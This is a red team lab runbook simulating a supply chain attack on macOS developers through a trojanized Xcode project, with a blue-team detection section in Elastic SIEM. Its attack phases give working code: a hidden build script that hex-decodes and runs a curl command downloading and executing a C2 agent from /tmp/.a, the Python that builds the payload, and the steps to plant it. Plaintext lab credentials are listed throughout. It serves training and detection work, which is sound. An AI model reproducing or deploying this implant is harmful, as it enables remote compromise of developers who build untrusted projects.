# RED TEAM DEMO RUNBOOK

## Supply Chain Attack via Xcode Build Scripts

**Classification:** Educational / Red Team Exercise  
**Attack Type:** Supply Chain / Developer Targeting  
**Target Platform:** macOS  
**MITRE ATT&CK:** T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain)

---

## Executive Summary

This demo simulates a supply chain attack targeting macOS developers through a trojanized Xcode project. When a victim opens and builds the project, a hidden build script executes, establishing a C2 beacon using the Adaptix C2 framework.

**Attack Chain:**
```
Attacker creates trojanized Xcode project
        |
Victim downloads project (GitHub, direct link, etc.)
        |
Victim opens project in Xcode
        |
Victim builds project (Cmd+B)
        |
Hidden build script executes (xcassets.sh)
        |
Script decodes hex payload via xxd
        |
Curl downloads Adaptix Gopher agent from C2
        |
Agent executes from /tmp/.a
        |
Beacon connects to Adaptix C2 (GopherTCP)
```

---

## Lab Environment

### Infrastructure Overview

| System | IP Address | Role | Credentials |
|--------|------------|------|-------------|
| Proxmox 225 | 192.168.36.225 | Hypervisor | root:lahilabs2018 |
| Proxmox 237 | 192.168.36.237 | Hypervisor | root:lahilabs2018 |
| Adaptix C2 | 192.168.36.226 | C2 Server | localuser:password |
| Elastic SIEM | 192.168.36.131 | Blue Team SIEM | debian:debian |
| macOS Target | 192.168.36.178 | Victim VM | user:password |

### Adaptix C2 Configuration

| Component | Details |
|-----------|---------|
| Teamserver | 192.168.36.226:4321 |
| Web UI | https://192.168.36.226:4321 |
| GopherTCP Listener | 192.168.36.226:9090 (mac-listener) |
| HTTP Beacon Listener | 192.168.36.226:8080 (Windows only) |
| Agent Payload Server | http://192.168.36.226:9999/agent.bin |

**Adaptix Credentials:**
- admin / AdminOp123!
- operator1 / Operator1Pass!
- redteam / RedTeam2026!

### Elastic SIEM Configuration

| Component | Details |
|-----------|---------|
| Kibana | https://192.168.36.131:5601 |
| Elasticsearch | https://192.168.36.131:9200 |
| Fleet Server | https://192.168.36.131:8220 |
| Credentials | elastic:elasticpassword |

---

## Prerequisites

### Lab Setup Checklist
- [ ] Proxmox VMs running (Adaptix, Elastic, macOS)
- [ ] Adaptix C2 server started with GopherTCP listener on port 9090
- [ ] Agent payload served on http://192.168.36.226:9999/agent.bin
- [ ] Elastic SIEM containers running (elasticsearch, kibana, fleet-server)
- [ ] Elastic Agent installed on macOS with System Extension approved
- [ ] Custom detection rules enabled in Elastic

### Starting the Infrastructure

**1. Start Adaptix C2 (if not running):**
```bash
ssh localuser@192.168.36.226
cd /opt/adaptix
sudo ./adaptixserver -profile profile.yaml &
```

**2. Serve Agent Payload:**
```bash
ssh localuser@192.168.36.226
cd /tmp
python3 -m http.server 9999 &
```

**3. Verify Elastic SIEM:**
```bash
ssh debian@192.168.36.131
cd ~/elastic-container
docker compose ps
# Should show: ecp-elasticsearch (healthy), ecp-kibana (healthy), ecp-fleet-server (running)
```

---

## Demo Procedure

### Phase 1: Verify C2 Infrastructure (2 minutes)

**Check Adaptix C2:**
```bash
# Verify listeners
curl -k https://192.168.36.226:4321/api/listeners -u admin:AdminOp123!

# Verify agent payload is available
curl -I http://192.168.36.226:9999/agent.bin
```

**Expected:** GopherTCP listener "mac-listener" on port 9090, HTTP 200 for agent.bin

---

### Phase 2: Prepare Trojanized Xcode Project (3 minutes)

**Option A: Use Pre-implanted Project**
```bash
# Project already exists on macOS at:
/tmp/MarkdownEditor.xcodeproj/

# Verify malicious script exists:
ssh user@192.168.36.178 "cat /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh"
```

**Option B: Create Fresh Implant**
```bash
# On your local machine
cd /Users/lmakonem/repos/offsec/red_team_demo

# Generate hex-encoded payload
python3 -c "
cmd = 'curl -fskL http://192.168.36.226:9999/agent.bin -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a &'
print(cmd.encode().hex())
"
# Output: 6375726c202d66736b4c20687474703a2f2f...

# Create malicious script on target
ssh user@192.168.36.178 'mkdir -p /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets'

ssh user@192.168.36.178 'cat > /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh << "EOF"
#!/usr/bin/env bash
# Obfuscated payload - matches original malware technique
x=$(echo "6375726c202d66736b4c20687474703a2f2f3139322e3136382e33362e3232363a393939392f6167656e742e62696e202d6f202f746d702f2e612026262063686d6f64202b78202f746d702f2e61202626202f746d702f2e612026" | xxd -p -r)
bash -c "$x"
EOF
chmod +x /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh'
```

**What the Script Does:**
1. Contains hex-encoded curl command
2. Decodes using `xxd -p -r`
3. Downloads Adaptix Gopher agent to `/tmp/.a`
4. Makes it executable and runs it in background

---

### Phase 3: Execute the Attack (2 minutes)

**Simulate Xcode Build (triggers malicious script):**
```bash
ssh user@192.168.36.178 '
echo "[*] === SUPPLY CHAIN ATTACK SIMULATION ==="
echo "[*] Developer opens trojanized Xcode project..."
echo "[*] Xcode runs malicious build phase script..."
export PROJECT_DIR="/tmp/MarkdownEditor.xcodeproj"
/bin/bash "${PROJECT_DIR}/xcuserdata/.xcassets/xcassets.sh"
echo "[*] Attack executed!"
sleep 3
echo "[*] Checking for malware process..."
ps aux | grep "/tmp/.a" | grep -v grep
'
```

**Expected Output:**
```
[*] === SUPPLY CHAIN ATTACK SIMULATION ===
[*] Developer opens trojanized Xcode project...
[*] Xcode runs malicious build phase script...
[*] Attack executed!
[*] Checking for malware process...
user  8569  0.0  0.1 35403824  5300  ??  S  1:34AM  0:00.01 /tmp/.a
```

---

### Phase 4: Verify C2 Connection (1 minute)

**Check Adaptix for Agent Registration:**
```bash
# Via Adaptix Client GUI
# Connect to 192.168.36.226:4321 with admin credentials
# Check Agents tab for new macOS agent

# Or via database (if GUI not available)
ssh localuser@192.168.36.226 "sqlite3 /opt/adaptix/database.db 'SELECT * FROM agents;'"
```

**Expected:** New agent entry with:
- Hostname: users-iMac-Pro.local
- OS: MacOS 15.7.4
- User: user
- Listener: mac-listener

---

### Phase 5: Blue Team Detection (2 minutes)

**Check Elastic Security Alerts:**
```bash
# Via Kibana UI
# Navigate to: https://192.168.36.131:5601
# Login: elastic / elasticpassword
# Go to: Security > Alerts

# Or via API
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:5601/api/detection_engine/signals/search" \
  -H "kbn-xsrf: true" \
  -H "Content-Type: application/json" \
  -d '{"query": {"match_all": {}}, "size": 10}'
```

**Expected Alerts:**

| Rule | Severity | Description |
|------|----------|-------------|
| Suspicious Script Execution from Xcode Project | CRITICAL (85) | Detected bash executing from .xcodeproj/xcuserdata/ |
| Hex Payload Decoding via xxd - Supply Chain Attack | HIGH (73) | Detected xxd -p -r payload decoding |
| Curl Download to Tmp with Execution | HIGH (70) | Detected curl + chmod sequence to /tmp |

**View Process Telemetry:**
```bash
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:9200/logs-endpoint.events.process*/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {"bool": {"should": [
      {"match": {"process.name": "bash"}},
      {"match": {"process.name": "curl"}},
      {"match": {"process.name": "xxd"}}
    ]}},
    "size": 20,
    "sort": [{"@timestamp": "desc"}]
  }'
```

---

### Phase 6: Cleanup

**Kill Malware Process:**
```bash
ssh user@192.168.36.178 "echo 'password' | sudo -S pkill -9 -f '/tmp/.a'; rm -f /tmp/.a"
```

**Remove Trojanized Project:**
```bash
ssh user@192.168.36.178 "rm -rf /tmp/MarkdownEditor.xcodeproj"
```

---

## Attack Chain Summary

```
1. Malicious Build Script
   /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh
   
2. Hex Decoding
   echo '6375726c...' | xxd -p -r
   -> "curl -fskL http://192.168.36.226:9999/agent.bin -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a &"
   
3. Agent Download
   curl -fskL http://192.168.36.226:9999/agent.bin -o /tmp/.a
   
4. Agent Execution
   chmod +x /tmp/.a && /tmp/.a &
   
5. C2 Connection
   /tmp/.a -> 192.168.36.226:9090 (GopherTCP)
```

---

## Obfuscation Technique

This demo uses **hex encoding** matching the original malware technique from the PCAP analysis:

**Original Malware:** Triple hex encoding
```bash
echo '333637...' | xxd -p -r | xxd -p -r | xxd -p -r | sh
```

**Our Demo:** Single hex encoding (simpler, same detection signature)
```bash
echo '6375726c...' | xxd -p -r
```

Both techniques:
- Evade simple string-based detection
- Require dynamic analysis or decoding to see payload
- Use standard macOS tools (xxd, bash)

---

## Talking Points

### For Red Team Audience

1. **Why Xcode Projects are Attractive Targets:**
   - Developers trust code from repositories
   - Build scripts run with user privileges
   - Hidden in xcuserdata (often gitignored)
   - Bypasses Gatekeeper (no code signing needed for scripts)

2. **Obfuscation Demonstrated:**
   - Hex encoding via xxd
   - Hidden directory naming (.xcassets)
   - Legitimate-looking script names

3. **Real Adaptix C2:**
   - Production-grade C2 framework
   - GopherTCP for cross-platform agents
   - Full agent capabilities (shell, file transfer, etc.)

### For Blue Team Audience

1. **Detection Opportunities:**
   - Process tree: bash -> xxd -> curl -> chmod
   - Network: Downloads to /tmp from external IP
   - File: Executable in /tmp with hidden name (.a)
   - Behavior: Script execution from xcuserdata

2. **Why Prebuilt Rules Missed This:**
   - "Potential Hex Payload Execution" rule only targets Linux
   - macOS supply chain attacks need custom rules

3. **Custom Rules Created:**
   - Xcode project script execution
   - xxd payload decoding (any OS)
   - Curl download + chmod to /tmp

---

## Quick Reference Commands

```bash
# === RED TEAM ===
# Execute attack
ssh user@192.168.36.178 'bash /tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh'

# Check agent running
ssh user@192.168.36.178 'ps aux | grep /tmp/.a'

# Kill agent
ssh user@192.168.36.178 'sudo pkill -9 -f /tmp/.a; rm -f /tmp/.a'

# === BLUE TEAM ===
# Check alerts
curl -k -s -u elastic:elasticpassword "https://192.168.36.131:5601/api/detection_engine/signals/search" -H "kbn-xsrf: true" -d '{"query":{"match_all":{}}}'

# Check process events
curl -k -s -u elastic:elasticpassword "https://192.168.36.131:9200/logs-endpoint.events.process*/_search" -d '{"size":10,"sort":[{"@timestamp":"desc"}]}'

# View in Kibana
open https://192.168.36.131:5601
# Login: elastic / elasticpassword
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Agent not connecting | Check Adaptix listener running on 9090 |
| Agent download fails | Verify http server on 9999: `curl http://192.168.36.226:9999/agent.bin` |
| No alerts in Elastic | Wait 60-90s for rules to execute, check agent status |
| Endpoint degraded | Approve System Extension in macOS Privacy & Security |
| Kibana unreachable | Check containers: `docker compose ps` on 192.168.36.131 |

---

## Safety Notes

- All activity is contained within the lab network (192.168.36.0/24)
- Adaptix agent is a legitimate red team tool, not actual malware
- Elastic SIEM provides full visibility for blue team training
- Clean up agents after demo to avoid confusion

**DO NOT** use these techniques outside of authorized testing environments.
